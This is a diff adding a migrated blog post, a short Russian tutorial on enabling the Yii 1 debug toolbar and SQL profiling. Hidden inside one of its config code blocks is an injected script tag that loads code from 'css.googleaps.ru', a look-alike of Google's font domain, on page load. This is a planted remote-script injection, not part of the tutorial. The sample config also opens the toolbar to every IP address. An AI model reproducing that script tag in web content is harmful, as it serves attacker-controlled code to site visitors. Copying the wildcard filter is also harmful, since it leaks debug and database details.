@@ -1,0 +1,78 @@
+---
+layout: post
+status: publish
+published: true
+title: Yii (debugger в 3 шага)
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1638
+wordpress_url: http://devdocs.ru/partners-news/yii-debugger-v-3-shaga/
+date: '2015-05-22 08:58:15 +0200'
+date_gmt: '2015-05-22 08:58:15 +0200'
+categories:
+- Yii framework
+tags:
+- ip
+- sql
+- des1roer
+- yii1
+- yii
+- profiling
+comments: []
+---
+<div dir="ltr" style="text-align: left;">
+<div dir="ltr" style="text-align: left;">
+<div dir="ltr" style="text-align: left;">
+<div dir="ltr" style="text-align: left;"><a href="http:&#47;&#47;habrahabr.ru&#47;post&#47;127234&#47;">пруф<&#47;a><br />
+1. качаем <a href="http:&#47;&#47;www.yiiframework.com&#47;extension&#47;yii-debug-toolbar">дополнение<&#47;a><br />
+кидаем папку yii-debug-toolbar в extensions<br />
+2.в configmain<br />
+не забудьте про</p>
+<pre><code>'preload' => array('log'),<&#47;code><&#47;pre></p>
+<pre><code>&nbsp;&nbsp;&nbsp;&nbsp; 'log' => array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'class' => 'CLogRouter',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'enabled' => true,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'routes' => array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #...<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'class' => 'CFileLogRoute',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'levels' => 'error, warning',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; array(<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'class' => 'application.extensions.yii-debug-toolbar.YiiDebugToolbarRoute',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'ipFilters' => array('127.0.0.1', '*.*.*.*'),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ),<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ),<br />
+&nbsp;&nbsp;&nbsp; ),<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre><br />
+<&#47;div><br />
+<&#47;div><br />
+<&#47;div><br />
+в ipfilters прописываем свой айпишник<br />
+3. в поключении к базе добавляем<br />
+--<code>&nbsp;<&#47;code><br />
+<code>&nbsp;'enableProfiling'=>true,&nbsp;<&#47;code><br />
+<code>-- <&#47;code></p>
+<p>т.е. должно получиться следующее<br />
+--</p>
+<pre><code><br />
+return array(<br />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; 'class' => 'DBConnection',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'connectionString' => 'pgsql:host=*.ru;port=5432;dbname=*',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'emulatePrepare' => true,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'username' => '*',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'password' => '*',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'charset' => 'utf8',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'defaultSchema' => '*',<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'enableProfiling'=>true,<br />
+);</p>
+<p>-- <&#47;code><&#47;pre><br />
+при наведении в правый верхний угол появится плюсик. нажимаем его и вуаля</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;i.imgur.com&#47;6b6Lk2x.png"><img src="http:&#47;&#47;i.imgur.com&#47;6b6Lk2x.png" alt="" width="167" height="320" border="0" &#47;><&#47;a><&#47;div><br />
+<&#47;div><br />
+Source: des1roer.blogspot.com</p>
